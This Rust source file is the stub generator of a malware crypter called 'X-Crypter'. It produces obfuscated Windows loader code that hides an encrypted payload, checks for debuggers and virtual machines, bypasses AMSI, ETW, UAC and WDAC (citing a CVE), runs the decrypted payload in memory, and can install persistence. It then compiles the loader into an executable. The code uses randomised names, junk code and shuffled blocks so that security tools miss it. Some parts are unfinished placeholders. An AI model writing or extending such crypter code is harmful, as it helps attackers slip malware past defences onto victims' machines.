// Stub Generator
// Generates polymorphic decryptor stub code

use crate::crypter::encryptor::EncryptionMethod;
use crate::crypter::mutator::{random_var_name, random_function_name, generate_junk_code, obfuscate_key};
use crate::crypter::obfuscator::generate_dead_code;
use std::fs;
use std::path::PathBuf;
use std::process::Command;
use rand::seq::SliceRandom;

/// Find project root directory using multiple strategies
fn find_project_root() -> Result<PathBuf, String> {
    // Strategy 1: Look for stub/Cargo.toml in current directory or parents
    let mut current = std::env::current_dir()
        .map_err(|e| format!("Failed to get current directory: {}", e))?;
    
    loop {
        let stub_cargo = current.join("stub/Cargo.toml");
        if stub_cargo.exists() {
            return Ok(current);
        }
        
        match current.parent() {
            Some(parent) => current = parent.to_path_buf(),
            None => break,
        }
    }
    
    // Strategy 2: Use executable path
    if let Ok(exe_path) = std::env::current_exe() {
        if let Some(exe_dir) = exe_path.parent() {
            // Try to find project root from executable location
            // (executable is typically in target/release/ or similar)
            let mut current = exe_dir.to_path_buf();
            
            loop {
                let stub_cargo = current.join("stub/Cargo.toml");
                if stub_cargo.exists() {
                    return Ok(current);
                }
                
                match current.parent() {
                    Some(parent) => current = parent.to_path_buf(),
                    None => break,
                }
            }
        }
    }
    
    // Strategy 3: Use CARGO_MANIFEST_DIR if available (set by Cargo)
    if let Ok(manifest_dir) = std::env::var("CARGO_MANIFEST_DIR") {
        let manifest_path = std::path::Path::new(&manifest_dir);
        // Go up from src-tauri to project root
        if let Some(parent) = manifest_path.parent() {
            let stub_cargo = parent.join("stub/Cargo.toml");
            if stub_cargo.exists() {
                return Ok(parent.to_path_buf());
            }
        }
    }
    
    Err("Could not find project root directory (stub/Cargo.toml not found)".to_string())
}

/// Generate stub Rust code that will decrypt and execute the payload
pub fn generate_stub_code(
    encrypted_payload: &[u8],
    encryption_key: &[u8],
    encryption_iv: Option<&[u8]>,
    method: EncryptionMethod,
    anti_vm: bool,
    anti_debug: bool,
    bypass_amsi: bool,
    patch_etw: bool,
    heap_encryption: bool,
    anti_dump: bool,
    sleep_enabled: bool,
    sleep_seconds: u64,
    persistence: bool,
    persistence_method: Option<&str>,
    bypass_uac: bool,
) -> String {
    let mut code = String::new();
    
    // Generate random function names
    let decrypt_fn = random_function_name("decrypt");
    let check_debug_fn = random_function_name("check_debug");
    let check_vm_fn = random_function_name("check_vm");
    let bypass_amsi_fn = random_function_name("bypass_amsi");
    let patch_etw_fn = random_function_name("patch_etw");
    let bypass_uac_fn = random_function_name("bypass_uac");
    let wdac_bypass_fn = random_function_name("bypass_wdac");
    let execute_fn = random_function_name("execute");
    let encrypt_heap_fn = random_function_name("encrypt_heap");
    let decrypt_heap_fn = random_function_name("decrypt_heap");
    let gen_heap_key_fn = random_function_name("gen_heap_key");
    let clear_mem_fn = random_function_name("clear_mem");
    let persist_fn = random_function_name("persist");
    
    // Header
    code.push_str("#![windows_subsystem = \"windows\"]\n");
    code.push_str("// X-Crypter Stub - AUTO-GENERATED\n");
    code.push_str("// Build time: ");
    code.push_str(&std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs()
        .to_string());
    code.push_str("\n\n");
    
    // Imports
    code.push_str("mod pe_loader;\n");
    code.push_str("mod evasion;\n");
    code.push_str("mod persistence;\n");
    code.push_str("mod api_resolver;\n");
    code.push_str("mod syscalls;\n");
    code.push_str("mod api_unhook;\n");
    code.push_str("mod process_hollowing;\n");
    code.push_str("mod reflective_loader;\n");
    code.push_str("mod thread_hijack;\n");
    code.push_str("mod amsi_bypass;\n");
    code.push_str("mod etw_patch;\n");
    code.push_str("mod heap_encryption;\n");
    code.push_str("mod anti_dump;\n");
    code.push_str("mod peb_manipulation;\n");
    code.push_str("mod stack_spoofing;\n");
    code.push_str("mod module_stomping;\n");
    code.push_str("mod early_bird;\n");
    code.push_str("mod env_manipulation;\n");
    code.push_str("mod uac_bypass;\n");
    code.push_str("mod wdac_bypass;\n");
    code.push_str("use pe_loader::load_and_execute_pe;\n");
    code.push_str("use pe_loader::load_and_execute_pe_threaded;\n");
    code.push_str("use evasion::check_environment;\n");
    code.push_str("use std::ptr;\n");
    code.push_str("use winapi::um::memoryapi::*;\n");
    code.push_str("use winapi::um::libloaderapi::*;\n");
    code.push_str("use winapi::um::winnt::*;\n");
    code.push_str("use winapi::um::processthreadsapi::*;\n");
    code.push_str("use std::thread;\n");
    code.push_str("use std::time::Duration;\n\n");
    
    // Obfuscate encryption key
    let (obfuscated_key, xor_const) = obfuscate_key(encryption_key);
    let key_var = random_var_name();
    let xor_const_var = random_var_name();
    
    // XOR constant for deobfuscation
    code.push_str(&format!("const {}: u8 = 0x{:02x};\n\n", xor_const_var.to_uppercase(), xor_const));
    
    // Obfuscated encryption key
    code.push_str(&format!("const {}: &[u8] = &[\n", key_var.to_uppercase()));
    for chunk in obfuscated_key.chunks(16) {
        code.push_str("    ");
        for byte in chunk {
            code.push_str(&format!("0x{:02x}, ", byte));
        }
        code.push_str("\n");
    }
    code.push_str("];\n\n");
    
    // Deobfuscate function for key
    let deobfuscate_key_fn = random_function_name("deobfuscate");
    code.push_str(&format!("fn {}(obfuscated: &[u8], xor_const: u8) -> Vec<u8> {{\n", deobfuscate_key_fn));
    code.push_str("    obfuscated.iter().map(|b| b ^ xor_const).collect()\n");
    code.push_str("}\n\n");
    
    // IV (if present) - also obfuscated
    let iv_var = if let Some(iv) = encryption_iv {
        let (obfuscated_iv, iv_xor_const) = obfuscate_key(iv);
        let iv_xor_var = random_var_name();
        let iv_name = random_var_name();
        
        code.push_str(&format!("const {}: u8 = 0x{:02x};\n\n", iv_xor_var.to_uppercase(), iv_xor_const));
        code.push_str(&format!("const {}: &[u8] = &[\n", iv_name.to_uppercase()));
        for chunk in obfuscated_iv.chunks(16) {
            code.push_str("    ");
            for byte in chunk {
                code.push_str(&format!("0x{:02x}, ", byte));
            }
            code.push_str("\n");
        }
        code.push_str("];\n\n");
        Some((iv_name, iv_xor_var))
    } else {
        None
    };
    
    // Embedded encrypted payload
    let payload_var = random_var_name();
    code.push_str(&format!("const {}: &[u8] = &[\n", payload_var.to_uppercase()));
    for chunk in encrypted_payload.chunks(16) {
        code.push_str("    ");
        for byte in chunk {
            code.push_str(&format!("0x{:02x}, ", byte));
        }
        code.push_str("\n");
    }
    code.push_str("];\n\n");
    
    // Main function with control flow obfuscation
    code.push_str("fn main() {\n");
    
    // Build execution blocks for reordering
    let mut execution_blocks = Vec::new();
    
    // Block 1: Junk code
    let junk_block = format!("    {}\n", generate_junk_code());
    execution_blocks.push(("junk", junk_block));
    
    // Block 2: Deobfuscate key
    let deobfuscate_key_block = format!("    let {} = {}({}, {});\n", 
        key_var, deobfuscate_key_fn, key_var.to_uppercase(), xor_const_var.to_uppercase());
    execution_blocks.push(("deobfuscate_key", deobfuscate_key_block));
    
    // Block 3: Deobfuscate IV if present
    if let Some((iv_name, iv_xor_var)) = &iv_var {
        let deobfuscate_iv_block = format!("    let {} = {}({}, {});\n",
            iv_name, deobfuscate_key_fn, iv_name.to_uppercase(), iv_xor_var.to_uppercase());
        execution_blocks.push(("deobfuscate_iv", deobfuscate_iv_block));
    }
    
    // Block 4: Sleep (if enabled)
    if sleep_enabled {
        let sleep_block = format!("    thread::sleep(Duration::from_secs({}));\n", sleep_seconds);
        execution_blocks.push(("sleep", sleep_block));
    }
    
    // Block 5: Anti-debug check
    if anti_debug {
        let anti_debug_block = format!("    if {}() {{\n        std::process::exit(0);\n    }}\n", check_debug_fn);
        execution_blocks.push(("anti_debug", anti_debug_block));
    }
    
    // Block 6: Anti-VM check
    if anti_vm {
        let anti_vm_block = format!("    if {}() {{\n        std::process::exit(0);\n    }}\n", check_vm_fn);
        execution_blocks.push(("anti_vm", anti_vm_block));
    }
    
    // Block 6.5: WDAC Bypass (CVE-2025-26678) - Early in execution, before AMSI/ETW
    let wdac_block = format!("    if !{}() {{\n        // WDAC bypass failed, but continue anyway\n    }}\n", wdac_bypass_fn);
    execution_blocks.push(("wdac", wdac_block));
    
    // Block 7: Bypass AMSI
    if bypass_amsi {
        let amsi_block = format!("    {}();\n", bypass_amsi_fn);
        execution_blocks.push(("amsi", amsi_block));
    }
    
    // Block 8: Patch ETW
    if patch_etw {
        let etw_block = format!("    {}();\n", patch_etw_fn);
        execution_blocks.push(("etw", etw_block));
    }
    
    // Block 8.5: UAC Bypass (if enabled, before payload execution)
    if bypass_uac {
        let uac_block = format!("    {}();\n", bypass_uac_fn);
        execution_blocks.push(("uac", uac_block));
    }
    
    // Block 9: Decrypt payload
    let method_enum = match method {
        EncryptionMethod::AES256 => "EncryptionMethod::AES256",
        EncryptionMethod::XOR => "EncryptionMethod::XOR",
        EncryptionMethod::RC4 => "EncryptionMethod::RC4",
        EncryptionMethod::Custom => "EncryptionMethod::Custom",
    };
    let decrypt_block = format!("    let mut decrypted = {}({}, &{}, {});\n", 
        decrypt_fn, payload_var.to_uppercase(), key_var, method_enum);
    execution_blocks.push(("decrypt", decrypt_block));
    
    // Block 10: Heap encryption (if enabled)
    if heap_encryption {
        let heap_key_block = format!("    let heap_key = {}();\n", gen_heap_key_fn);
        let heap_encrypt_block = format!("    let encrypted_heap = {}(&decrypted, &heap_key);\n", encrypt_heap_fn);
        let heap_decrypt_block = format!("    decrypted = {}(&encrypted_heap, &heap_key);\n", decrypt_heap_fn);
        execution_blocks.push(("heap_key", heap_key_block));
        execution_blocks.push(("heap_encrypt", heap_encrypt_block));
        execution_blocks.push(("heap_decrypt", heap_decrypt_block));
    }
    
    // Block 11: Execute in memory
    let execute_block = format!("    {}(&decrypted);\n", execute_fn);
    execution_blocks.push(("execute", execute_block));
    
    // Block 12: Anti-dump (if enabled)
    if anti_dump {
        let anti_dump_block = format!("    {}(&decrypted);\n", clear_mem_fn);
        execution_blocks.push(("anti_dump", anti_dump_block));
    }
    
    // Block 13: Persistence (if enabled)
    if persistence {
        if let Some(method) = persistence_method {
            let persist_block = format!("    {}(\"{}\");\n", persist_fn, method);
            execution_blocks.push(("persist", persist_block));
        }
    }
    
    // Use control flow obfuscation for non-critical blocks
    // Critical blocks (deobfuscate, decrypt, execute) must stay in order
    let critical_blocks = vec!["deobfuscate_key", "deobfuscate_iv", "decrypt", "execute"];
    let mut critical_indices = Vec::new();
    let mut non_critical_blocks = Vec::new();
    
    for (i, (name, _)) in execution_blocks.iter().enumerate() {
        if critical_blocks.contains(name) {
            critical_indices.push(i);
        } else {
            non_critical_blocks.push(i);
        }
    }
    
    // Write blocks in order (critical blocks maintain order, others can be reordered)
    let mut written_indices = std::collections::HashSet::new();
    let mut rng = rand::thread_rng();
    
    // Write critical blocks first in order
    for &idx in &critical_indices {
        code.push_str(&execution_blocks[idx].1);
        written_indices.insert(idx);
    }
    
    // Write non-critical blocks (can be reordered)
    let mut remaining: Vec<usize> = non_critical_blocks.iter()
        .filter(|&&i| !written_indices.contains(&i))
        .copied()
        .collect();
    remaining.shuffle(&mut rng);
    for idx in &remaining {
        code.push_str(&execution_blocks[*idx].1);
    }
    
    code.push_str("\n");
    code.push_str("}\n\n");
    
    // Add dead code insertion
    code.push_str("// Dead code (unreachable)\n");
    code.push_str(&generate_dead_code());
    code.push_str("\n\n");
    
    // Helper function stubs with random names
    code.push_str(&format!(r#"
fn {}(encrypted: &[u8], key: &[u8], method: EncryptionMethod) -> Vec<u8> {{
    // Decryption logic - to be implemented in Phase 3
    match method {{
        EncryptionMethod::XOR => {{
            let mut decrypted = Vec::with_capacity(encrypted.len());
            for (i, byte) in encrypted.iter().enumerate() {{
                decrypted.push(byte ^ key[i % key.len()]);
            }}
            decrypted
        }},
        _ => {{
            // AES, RC4, Custom - to be implemented
            vec![]
        }}
    }}
}}

fn {}() -> bool {{
    unsafe {{
        check_environment(true, false) // Check debugger only
    }}
}}

fn {}() -> bool {{
    unsafe {{
        check_environment(false, true) // Check VM only
    }}
}}

fn {}() {{
    unsafe {{
        let _ = amsi_bypass::bypass_amsi();
    }}
}}

fn {}() {{
    unsafe {{
        let _ = etw_patch::patch_etw();
    }}
}}

fn {}() -> bool {{
    unsafe {{
        // Check and bypass WDAC (CVE-2025-26678)
        // Returns true if bypassed or WDAC not present, false if bypass failed
        wdac_bypass::check_and_bypass_wdac()
    }}
}}

fn {}() {{
    unsafe {{
        // Get current executable path
        let mut exe_path = [0u16; 260];
        let len = GetModuleFileNameW(
            ptr::null_mut(),
            exe_path.as_mut_ptr(),
            exe_path.len() as u32,
        );
        if len > 0 {{
            let path_str: String = String::from_utf16_lossy(
                &exe_path[..len as usize]
            );
            let _ = uac_bypass::bypass_uac(&path_str);
        }}
    }}
}}

fn {}(pe_data: &[u8]) {{
    unsafe {{
        // Use threaded execution for stealth (stub can exit while payload runs)
        match load_and_execute_pe_threaded(pe_data) {{
            Ok(_) => {{}},
            Err(_) => {{ 
                // Fallback to direct execution if thread creation fails
                let _ = load_and_execute_pe(pe_data);
            }}
        }}
    }}
}}

fn {}(data: &[u8], key: &[u8]) -> Vec<u8> {{
    // Heap encryption - to be implemented in Phase 7
    vec![]
}}

fn {}(encrypted: &[u8], key: &[u8]) -> Vec<u8> {{
    // Heap decryption - to be implemented in Phase 7
    vec![]
}}

fn {}() -> Vec<u8> {{
    // Generate heap encryption key
    vec![]
}}

fn {}(data: &[u8]) {{
    // Clear memory - to be implemented in Phase 7
}}

fn {}(method: &str) {{
    unsafe {{
        // Get current executable path
        let mut exe_path = [0u16; 260];
        let len = GetModuleFileNameW(
            ptr::null_mut(),
            exe_path.as_mut_ptr(),
            exe_path.len() as u32,
        );
        if len > 0 {{
            let path_str: String = String::from_utf16_lossy(
                &exe_path[..len as usize]
            );
            let _ = execute_persistence(method, &path_str);
        }}
    }}
}}

enum EncryptionMethod {{
    AES256,
    XOR,
    RC4,
    Custom,
}}
"#, 
        decrypt_fn, check_debug_fn, check_vm_fn, bypass_amsi_fn, patch_etw_fn, bypass_uac_fn, wdac_bypass_fn,
        execute_fn, encrypt_heap_fn, decrypt_heap_fn, gen_heap_key_fn, clear_mem_fn, persist_fn
    ));
    
    code
}

/// Write generated stub code to stub/src/main.rs
pub fn write_stub_code(stub_code: &str) -> Result<PathBuf, String> {
    let project_root = find_project_root()?;
    let stub_main_path = project_root.join("stub/src/main.rs");
    
    // Create parent directories if they don't exist (stub/src/)
    if let Some(parent) = stub_main_path.parent() {
        if !parent.exists() {
            fs::create_dir_all(parent)
                .map_err(|e| format!("Failed to create stub directory: {}", e))?;
        }
    }
    
    fs::write(&stub_main_path, stub_code)
        .map_err(|e| format!("Failed to write stub code: {}", e))?;
    
    Ok(stub_main_path)
}

/// Compile stub to executable
pub fn compile_stub(output_path: &PathBuf) -> Result<PathBuf, String> {
    // Check if we're on Windows - stub is Windows-only
    #[cfg(not(target_os = "windows"))]
    {
        return Err("Stub compilation requires Windows. The stub is a Windows PE executable that can only be compiled on Windows. Please use a Windows machine or cross-compile from Windows.".to_string());
    }
    
    #[cfg(target_os = "windows")]
    {
        let project_root = find_project_root()?;
        let stub_dir = project_root.join("stub");
        let stub_cargo = stub_dir.join("Cargo.toml");
        
        if !stub_cargo.exists() {
            return Err(format!(
                "Stub Cargo.toml not found at: {}. Make sure stub/ directory exists in project root.",
                stub_cargo.display()
            ));
        }
        
        // Compile stub
        let output = Command::new("cargo")
            .args(&["build", "--release", "--manifest-path"])
            .arg(&stub_cargo)
            .current_dir(&project_root)
            .output()
            .map_err(|e| format!("Failed to execute cargo: {}", e))?;
        
        if !output.status.success() {
            let stderr = String::from_utf8_lossy(&output.stderr);
            // Extract just the key error messages, not the full verbose output
            let error_lines: Vec<&str> = stderr
                .lines()
                .filter(|line| line.contains("error[E") || line.contains("error:"))
                .take(5)  // Limit to first 5 errors
                .collect();
            
            if error_lines.is_empty() {
                return Err("Stub compilation failed. Check cargo output for details.".to_string());
            }
            
            return Err(format!("Compilation failed: {}", error_lines.join("; ")));
        }
        
        // Find compiled executable
        let compiled_exe = stub_dir.join("target/release/stub.exe");
        if !compiled_exe.exists() {
            return Err("Compiled stub executable not found".to_string());
        }
        
        // Copy to output location
        fs::copy(&compiled_exe, output_path)
            .map_err(|e| format!("Failed to copy compiled stub: {}", e))?;
        
        Ok(output_path.clone())
    }
}
